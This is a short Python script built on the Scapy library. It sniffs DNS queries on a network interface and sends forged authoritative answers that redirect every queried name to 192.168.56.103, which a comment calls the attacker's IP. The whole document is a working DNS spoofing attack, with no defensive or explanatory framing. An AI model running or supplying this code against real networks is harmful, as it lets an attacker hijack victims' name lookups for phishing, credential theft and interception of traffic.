from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, UDP

def dns_spoof(pkt):

    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        # Check if packet is a DNS query
        print("Received DNS request")

        # Construct a DNS response to redirect the query to the attacker's IP
        dns_resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                   UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                       an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata="192.168.56.103"))

        # Send the crafted DNS response
        send(dns_resp, verbose=False)
        return "Spoofed DNS Response Sent"

def start_spoof(interface):
    # Start sniffing for DNS queries on the specified interface
    sniff(filter="udp port 53", iface=interface, prn=dns_spoof)

